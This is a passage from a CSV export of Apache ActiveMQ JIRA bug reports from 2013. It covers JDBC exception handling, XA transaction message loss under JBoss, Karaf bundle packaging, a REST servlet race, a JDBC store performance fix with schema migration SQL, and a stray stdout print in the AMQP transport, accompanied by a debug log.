",tested on trunk.,gtully,pgfox,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4643,,,,,,,,,,,,,,,,"18/Jul/13 08:56;pgfox;AMQ4636Test.java;https://issues.apache.org/jira/secure/attachment/12592940/AMQ4636Test.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,338662,,,Tue Jul 30 20:35:27 UTC 2013,,,,,,,,,,,"0|i1mev3:",338982,,,,,,,,,,,,,,,,,,,,,"18/Jul/13 10:23;gtully;there are two problems here.
1) there is no callback to the IOExceptionHandler in org.apache.activemq.store.jdbc.TransactionContext.close so the exception is not intercepted.

2) When an IOExceptionHandler wants to 'handle' an exception by stopping broker or transports, there is a race between the async stop and the exception response.

For 1, we need to invoke the handler
for 2, we need to let the IOExceptionHandler wrap the exception to indicate that it is handled such that can be trapped by org.apache.activemq.broker.TransportConnection#service and ignored. Something like SuppressReplyOnHandled(IOException).;;;","18/Jul/13 13:03;gtully;https://github.com/apache/activemq/blob/trunk/activemq-unit-tests/src/test/java/org/apache/activemq/broker/ft/DbRestartJDBCQueueMasterSlaveTest.java#L112
is also relevant for the consumer case. If we *want* to propagate store exceptions back to the client then they should not be IOExceptions. The Handler can do that also.;;;","19/Jul/13 13:58;pgfox;Thanks Gary, I have spilt your point 2 above into a separate JIRA https://issues.apache.org/jira/browse/AMQ-4643;;;","30/Jul/13 20:35;gtully;This is fixed as a byproduct of https://issues.apache.org/jira/browse/AMQ-4643 

The TransactionContext.close now correctly delegates to the IOExceptionHandler which handles the transaction commit/rollback failure cases;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Rar losing messages when there is a XA trx timeout (jboss),AMQ-4634,12657995,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gastonscapusio,gastonscapusio,16/Jul/13 13:04,19/Jul/13 09:07,14/Jul/23 05:43,19/Jul/13 09:06,5.6.0,5.7.0,5.8.0,,,5.9.0,,,,,,,0,,,,,,,,,"ActiveMQ does a trx commit when there is a transaction timeout (EJBTransactionRolledbackException). In this way we are losing messages when there is any timeout.
We have seen that the activemq connections are enlist in XA.
The attribute transactionContext from ActiveMQSession class has the global transaction reference (xid) before calling the MDB (messageListener.onMessage(message)).
When the timeout is reached and the RuntimeException is throwned, the transactionContext losed the xid reference.
Later, when ActiveMQSession call the method transactionContext.isInXATransaction() the result is false because there is no xid reference.

This situation only happened when the MDB calls other EJB (Stateless) with CMT - TransactionAttributeType.REQUIRES_NEW, and the exception is throwed inside the Stateless.


I've tried to reproduce this without calling the stateless ejb but it works well.
The ActiveMQSession class should retain the original transactionContext.

","JBoss 6.1.
ActiveMQ 5.8.0 (also tested in 5.7.0 and 5.6.0) standalone mode.",gastonscapusio,gtully,juanlopez,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jul/13 13:05;gastonscapusio;logs.txt;https://issues.apache.org/jira/secure/attachment/12592542/logs.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,338189,,,Fri Jul 19 09:06:14 UTC 2013,,,,,,,,,,,"0|i1mbyf:",338510,,,,,,,,,,,,,,,,,,,,,"16/Jul/13 13:05;gastonscapusio;JBoss server log;;;","17/Jul/13 21:17;gtully;@Gaston I think your issue is fixed by http://svn.apache.org/r1504279
the only caveat is that my use case does not need a call to another ejb. The scenario was an MDB spending longer than the TM timeout in onMessage so that the CMT had aborted on its return from onMessage. That was enough to loose a message through an auto ack in a local transaction. All in error.

Can you try out tonights snapshot to verify?
many thanks :-);;;","18/Jul/13 17:23;gastonscapusio;It's working!
Thanks.;;;","19/Jul/13 09:06;gtully;thanks for the verification.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-blueprint is missing,AMQ-4631,12657689,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,jbonofre,rrrrutdk,rrrrutdk,15/Jul/13 08:28,02/Oct/13 09:31,14/Jul/23 05:43,02/Oct/13 09:31,5.8.0,,,,,5.9.0,,,,,,,1,,,,,,,,,"features 'activemq-karaf/5.8.0/xml/features' does not contain feature 'activemq-blueprint'; and artifact 'activemq-blueprint' is not a bundle.

karaf users will be unable to use activemq namespace unless this bug is fixed.",,davsclaus,donnchadh,kai.reichert,rrrrutdk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,337909,,,Wed Oct 02 09:31:18 UTC 2013,,,,,,,,,,,"0|i1ma8f:",338231,,,,,,,,,,,,,,,,,,,,,"02/Oct/13 09:31;davsclaus;Works fine now;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-camel hosted on central maven repository is not a bundle,AMQ-4630,12657687,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,jbonofre,rrrrutdk,rrrrutdk,15/Jul/13 08:20,24/Sep/13 07:05,14/Jul/23 05:43,24/Sep/13 07:05,5.8.0,,,,,5.9.0,,,Camel,,,,0,,,,,,,,,"activemq-camel on the central repo is not a valid bundle, this makes the feature 'activemq-camel' can not be installed on apache karaf.",,davsclaus,rrrrutdk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,337907,,,Tue Sep 24 07:05:26 UTC 2013,,,,,,,,,,,"0|i1ma7z:",338229,,,,,,,,,,,,,,,,,,,,,"24/Sep/13 07:05;davsclaus;5.9 is osgi bundles again;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
REST MessageServlet swallowing Messages on high traffic topic,AMQ-4629,12657580,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,andrefx,andrefx,13/Jul/13 11:00,16/Jul/13 14:41,14/Jul/23 05:43,16/Jul/13 14:41,5.8.0,,,,,5.9.0,,,,,,,0,patch,,,,,,,,"Polling an amq topic via REST, MessageServlet:

on very fast message arrival the MessageAvalableListener is fired multiple times and then overwrites the message attribute of the Continuation.

This leads to messages getting lost.",Centos 6.3,andrefx,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Jul/13 11:01;andrefx;MessageServlet.java.patch;https://issues.apache.org/jira/secure/attachment/12592137/MessageServlet.java.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,337801,,,Tue Jul 16 14:41:35 UTC 2013,,,,,,,Patch Available,,,,"0|i1m9kf:",338123,,,,,,,,,,,,,,,,,,,,,"13/Jul/13 11:01;andrefx;setting the availableListener to null, prevents overwriting the message attribute of the Continuation;;;","16/Jul/13 14:41;tabish;patch applied with thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve Performance of JDBC store with large number of messages,AMQ-4628,12657251,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,11/Jul/13 12:30,03/Oct/13 09:51,14/Jul/23 05:43,03/Oct/13 09:51,5.8.0,,,,,5.9.0,,,,,,,1,,,,,,,,,"Currently JDBC store doesn't behave well when there's a huge backlog of messages (like 1 million or more). With some SQL improvements, we can make it work properly for this use case as well.",,davsclaus,dejanb,donnchadh,lucianc,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,337473,,,Thu Oct 03 09:51:01 UTC 2013,,,,,,,,,,,"0|i1m7jr:",337796,,,,,,,,,,,,,,,,,,,,,"11/Jul/13 14:20;dejanb;svn commit 1502206 contains the improvement related to XID column. The column was blob and not indexed, and most of the queries for non-xa case uses ""AND XID IS NULL"" in the queries, which kills the performance on large tables.

The change was introduced to treat XID as String, and put it into indexed varchar column.

In my tests it made the broker work properly with close to 2 million messages.

The testing scenario:

* Download the latest snapshot with the fix (or build locally) 

* I introduced a bit optimized configuration that turns off every non-essential feature, like expiry processing, database cleanup and priority messages. So start a broker with

{code}bin/activemq console xbean:conf/activemq-jdbc-performance.xml{code}

* Send large number of messages with

{code}ant producer -Durl=tcp://localhost:61616 -DparallelThreads=10 -Dtransacted=true -Dsubject=BenchmarkQueue -Dmax=200000 -Ddurable=true -Dbatch=1000{code}

Note that I added batch to work with producer tool, so we can send faster

* Restart the broker to check broker startup time

* Consumer messages with something like

{code}ant consumer -Durl=tcp://localhost:61616 -DparallelThreads=10 -Dtransacted=true -Dsubject=BenchmarkQueue -Dmax=80000{code}

I tested with local MySQL and it seems to work fine. It'd be good if people could test it with other RDBMS they use (Oracle, Postgres, etc.), to check if there's any other bottlenecks.;;;","11/Jul/13 14:36;dejanb;One thing though is that this schema is not compatible with the previous version if you're using XA transactions. You'll need to:

* Make sure you don't have an inflight transactions
* Stop the broker
* Alter the tables, by executing something like

{code}ALTER TABLE ACTIVEMQ_MSGS ALTER COLUMN XID VARCHAR(250)
CREATE INDEX ACTIVEMQ_MSGS_XIDX ON ACTIVEMQ_MSGS (XID)
ALTER TABLE ACTIVEMQ_ACKS ALTER COLUMN XID VARCHAR(250)
CREATE INDEX ACTIVEMQ_ACKS_XIDX ON ACTIVEMQ_ACKS (XID){code}

* Start the broker

This isn't needed if XA transactions are not used.
We need to put this into migration guide for 5.9;;;","03/Oct/13 07:08;davsclaus;Dejan, any more work to do? Or can we move this to 5.10 or should it be included in 5.9?;;;","03/Oct/13 09:51;dejanb;That's it for now. We should just add those schema upgrade to the release notes;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQP broker prints producer's connection id to stdout,AMQ-4626,12657023,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,axel.podehl,axel.podehl,10/Jul/13 07:57,15/Jul/13 12:55,14/Jul/23 05:43,15/Jul/13 12:55,5.9.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"Hi,

I'm using an AMQP transport connector in an embedded Broker, but whenever a producer is connecting the connection id appears on standard out. Probably some left-over of some debugging code ?
I tested also with the latest 5.9.0 snapshot from 7/9/2013 and it's still there.

My code is something like this:

          String amqpURI = ""amqp://0.0.0.0:"" + amqpPort + ""?maximumConnections=1000&amp;wireformat.maxFrameSize=104857600"";
        
          logInfo(""ActiveMQ: adding AMQP transport: "" + amqpURI );
          
          TransportConnector amqpConnector = new TransportConnector();
          amqpConnector.setName(""amqp"");
          amqpConnector.setUri( new URI(amqpURI) );
          activeMqBroker.addConnector(amqpConnector);

and once a QPID amqp_1_0 producer connects, I see this (added newlines for clarity):

7924 [ActiveMQ BrokerService[localhost] Task-2] DEBUG org.apache.activemq.broker.region.Queue  - TEST toPageIn: 11, Inflight: 0, pagedInMessages.size 0, enqueueCount: 10, dequeueCount: 0


ID:Berlin-60845-1373442523293-2:1:0


----------- full trace (with some of my own logs in between):

Starting ActiveMQ Broker, see C:\CodeStreet\ReplayServiceJMS\bin\log\channel-jni.log
0 [main] INFO ChannelJNI  - ### Starting ActiveMQ broker with broker url: broker:(tcp://localhost:51515)?useJmx=true and parameters: persistent=true,memory=64mb,store=1GB,temp=100mb,amqpPort=5672
171 [main] INFO org.apache.activemq.store.kahadb.plist.PListStoreImpl  - PListStore:[C:\CodeStreet\ReplayServiceJMS\bin\activemq-data\localhost\tmp_storage] started
179 [main] INFO ChannelJNI  - ActiveMQ: adding AMQP transport: amqp://0.0.0.0:5672?maximumConnections=1000&amp;wireformat.maxFrameSize=104857600
179 [main] INFO ChannelJNI  - network connectors: []
179 [main] INFO ChannelJNI  - transport connectors: [tcp://127.0.0.1:51515, amqp]
225 [main] DEBUG org.apache.activemq.broker.jmx.ManagementContext  - Creating RMIRegistry on port 1099
258 [main] DEBUG org.apache.activemq.broker.jmx.ManagementContext  - Probably not using JRE 1.4: mx4j.tools.naming.NamingService
261 [main] DEBUG org.apache.activemq.broker.jmx.ManagementContext  - Created JMXConnectorServer javax.management.remote.rmi.RMIConnectorServer@4979935d
262 [JMX connector] DEBUG org.apache.activemq.broker.jmx.ManagementContext  - Starting JMXConnectorServer...
335 [main] INFO org.apache.activemq.broker.BrokerService  - Using Persistence Adapter: KahaDBPersistenceAdapter[C:\CodeStreet\ReplayServiceJMS\bin\activemq-data\localhost\KahaDB]
336 [JMX connector] INFO org.apache.activemq.broker.jmx.ManagementContext  - JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi
690 [main] DEBUG org.apache.activemq.store.kahadb.disk.page.PageFile  - Page File: activemq-data\localhost\KahaDB\db.data, Recovering page file...
700 [main] INFO org.apache.activemq.store.kahadb.MessageDatabase  - KahaDB is version 4
701 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
706 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
706 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
706 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
707 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
707 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
707 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
707 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
707 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
707 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
707 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
708 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
708 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
709 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.ListIndex  - loading
711 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
711 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
711 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
712 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
712 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
712 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
712 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
712 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.ListIndex  - loading
712 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
712 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
712 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
712 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
712 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
712 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
712 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
712 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.ListIndex  - loading
713 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
713 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
713 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
713 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
713 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
713 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
713 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
713 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.ListIndex  - loading
713 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
713 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
713 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
714 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
714 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
714 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
714 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
714 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.ListIndex  - loading
714 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
714 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
714 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
714 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
714 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
714 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
714 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
715 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.ListIndex  - loading
715 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
715 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
715 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
715 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
715 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
715 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
715 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.BTreeIndex  - loading
715 [main] DEBUG org.apache.activemq.store.kahadb.disk.index.ListIndex  - loading
730 [main] INFO org.apache.activemq.store.kahadb.MessageDatabase  - Recovering from the journal ...
740 [main] INFO org.apache.activemq.store.kahadb.MessageDatabase  - Recovery replayed 23 operations from the journal in 0.024 seconds.
929 [main] INFO org.apache.activemq.broker.BrokerService  - Apache ActiveMQ 5.8.0 (localhost, ID:Berlin-60845-1373442523293-0:1) is starting
934 [main] DEBUG org.apache.activemq.broker.region.AbstractRegion  - localhost adding destination: queue://TEST
957 [main] DEBUG org.apache.activemq.thread.TaskRunnerFactory  - Initialized TaskRunnerFactory[ActiveMQ BrokerService[localhost] Task] using ExecutorService: java.util.concurrent.ThreadPoolExecutor@26a3960
993 [main] DEBUG org.apache.activemq.broker.region.Queue  - TEST toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueCount: 0, dequeueCount: 0
1003 [main] DEBUG org.apache.activemq.broker.region.Queue  - TEST toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueCount: 0, dequeueCount: 0
1007 [main] DEBUG org.apache.activemq.broker.TransportConnector  - Publishing: tcp://127.0.0.1:51515 for broker transport URI: tcp://127.0.0.1:51515
1007 [main] DEBUG org.apache.activemq.broker.TransportConnector  - Publishing: amqp://0.0.0.0:5672 for broker transport URI: amqp://0.0.0.0:5672?maximumConnections=1000&amp;wireformat.maxFrameSize=104857600
1008 [main] INFO org.apache.activemq.transport.TransportServerThreadSupport  - Listening for connections at: tcp://127.0.0.1:51515
1009 [main] INFO org.apache.activemq.broker.TransportConnector  - Connector tcp://127.0.0.1:51515 Started
1015 [main] INFO org.apache.activemq.transport.TransportServerThreadSupport  - Listening for connections at: amqp://Berlin:5672?maximumConnections=1000&amp;wireformat.maxFrameSize=104857600
1015 [main] INFO org.apache.activemq.broker.TransportConnector  - Connector amqp Started
1017 [main] INFO org.apache.activemq.broker.BrokerService  - Apache ActiveMQ 5.8.0 (localhost, ID:Berlin-60845-1373442523293-0:1) started
1017 [main] INFO org.apache.activemq.broker.BrokerService  - For help or more information please see: http://activemq.apache.org
1020 [main] DEBUG org.apache.activemq.broker.region.AbstractRegion  - localhost adding destination: topic://ActiveMQ.Advisory.MasterBroker
1039 [main] INFO ChannelJNI  - ActiveMQ Broker Version: 5.8.0
1039 [main] INFO ChannelJNI  - ActiveMQ memory limit: 67108864
1039 [main] INFO ChannelJNI  - ActiveMQ memory percent used: 0
1039 [main] INFO ChannelJNI  - ActiveMQ persistent: true
1039 [main] INFO ChannelJNI  - ActiveMQ sendFailIfNoSpace: false
1039 [main] INFO ChannelJNI  - ActiveMQ memory: Usage(Main:memory) percentUsage=0%, usage=0, limit=67108864, percentUsageMinDelta=1%
1039 [main] INFO ChannelJNI  - ActiveMQ store: Usage(Main:store) percentUsage=0%, usage=265900, limit=1073741824, percentUsageMinDelta=1%
1039 [main] INFO ChannelJNI  - ActiveMQ data directory: activemq-data
1039 [main] INFO ChannelJNI  - ActiveMQ temp: Usage(Main:temp) percentUsage=0%, usage=0, limit=104857600, percentUsageMinDelta=1%
1039 [main] INFO ChannelJNI  - ActiveMQ temp directory: activemq-data\localhost\tmp_storage
started
5717 [ActiveMQ Journal Checkpoint Worker] DEBUG org.apache.activemq.store.kahadb.MessageDatabase  - Checkpoint started.
5718 [ActiveMQ Journal Checkpoint Worker] DEBUG org.apache.activemq.store.kahadb.MessageDatabase  - Checkpoint done.
7803 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.TransportConnection  - Setting up new connection id: ID:Berlin-60845-1373442523293-2:1, address: tcp://127.0.0.1:60846, info: ConnectionInfo {commandId = 0, responseRequired = true, connectionId = ID:Berlin-60845-1373442523293-2:1, clientId = TEST, clientIp = null, userName = guest, password = *****, brokerPath = null, brokerMasterConnector = false, manageable = false, clientMaster = true, faultTolerant = false, failoverReconnect = false}
7803 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.region.AbstractRegion  - localhost adding destination: topic://ActiveMQ.Advisory.Connection
7877 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.region.AbstractRegion  - localhost adding destination: topic://ActiveMQ.Advisory.Producer.Queue.TEST
7906 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.region.Queue  - localhost Message 0e7fc3d7-de11-4354-89a7-5773edaa9ba5 sent to queue://TEST
7906 [ActiveMQ BrokerService[localhost] Task-2] DEBUG org.apache.activemq.broker.region.Queue  - TEST toPageIn: 2, Inflight: 0, pagedInMessages.size 0, enqueueCount: 1, dequeueCount: 0
7909 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.region.Queue  - localhost Message d0938476-d96c-4995-a8f9-14fdfc799ab6 sent to queue://TEST
7909 [ActiveMQ BrokerService[localhost] Task-2] DEBUG org.apache.activemq.broker.region.Queue  - TEST toPageIn: 3, Inflight: 0, pagedInMessages.size 0, enqueueCount: 2, dequeueCount: 0
7911 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.region.Queue  - localhost Message 7af96bbf-8ced-46db-bac3-0f7caf1f3dff sent to queue://TEST
7911 [ActiveMQ BrokerService[localhost] Task-2] DEBUG org.apache.activemq.broker.region.Queue  - TEST toPageIn: 4, Inflight: 0, pagedInMessages.size 0, enqueueCount: 3, dequeueCount: 0
7912 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.region.Queue  - localhost Message 6d99ab81-3692-452f-9f37-c867b4b0e9d2 sent to queue://TEST
7913 [ActiveMQ BrokerService[localhost] Task-2] DEBUG org.apache.activemq.broker.region.Queue  - TEST toPageIn: 5, Inflight: 0, pagedInMessages.size 0, enqueueCount: 4, dequeueCount: 0
7914 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.region.Queue  - localhost Message 9065af75-3067-4562-a2c9-23dc23860408 sent to queue://TEST
7914 [ActiveMQ BrokerService[localhost] Task-2] DEBUG org.apache.activemq.broker.region.Queue  - TEST toPageIn: 6, Inflight: 0, pagedInMessages.size 0, enqueueCount: 5, dequeueCount: 0
7916 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.region.Queue  - localhost Message ac144f32-9355-4662-adb9-5cd16b86e6d0 sent to queue://TEST
7916 [ActiveMQ BrokerService[localhost] Task-2] DEBUG org.apache.activemq.broker.region.Queue  - TEST toPageIn: 7, Inflight: 0, pagedInMessages.size 0, enqueueCount: 6, dequeueCount: 0
7918 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.region.Queue  - localhost Message dfd673af-7553-4967-a98f-90aebb98e2af sent to queue://TEST
7918 [ActiveMQ BrokerService[localhost] Task-2] DEBUG org.apache.activemq.broker.region.Queue  - TEST toPageIn: 8, Inflight: 0, pagedInMessages.size 0, enqueueCount: 7, dequeueCount: 0
7920 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.region.Queue  - localhost Message 5677d1bf-4a7b-4dba-8378-f36c2d2f4bfb sent to queue://TEST
7921 [ActiveMQ BrokerService[localhost] Task-2] DEBUG org.apache.activemq.broker.region.Queue  - TEST toPageIn: 9, Inflight: 0, pagedInMessages.size 0, enqueueCount: 8, dequeueCount: 0
7922 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.region.Queue  - localhost Message cc82e930-1c8a-43ce-8990-1e697b8aebf2 sent to queue://TEST
7923 [ActiveMQ BrokerService[localhost] Task-2] DEBUG org.apache.activemq.broker.region.Queue  - TEST toPageIn: 10, Inflight: 0, pagedInMessages.size 0, enqueueCount: 9, dequeueCount: 0
7924 [ActiveMQ Transport: tcp:///127.0.0.1:60846@5672] DEBUG org.apache.activemq.broker.region.Queue  - localhost Message 306ef2f4-78f1-4842-a17d-1e43a73ea1c1 sent to queue://TEST
7924 [ActiveMQ BrokerService[localhost] Task-2] DEBUG org.apache.activemq.broker.region.Queue  - TEST toPageIn: 11, Inflight: 0, pagedInMessages.size 0, enqueueCount: 10, dequeueCount: 0
ID:Berlin-60845-1373442523293-2:1:0
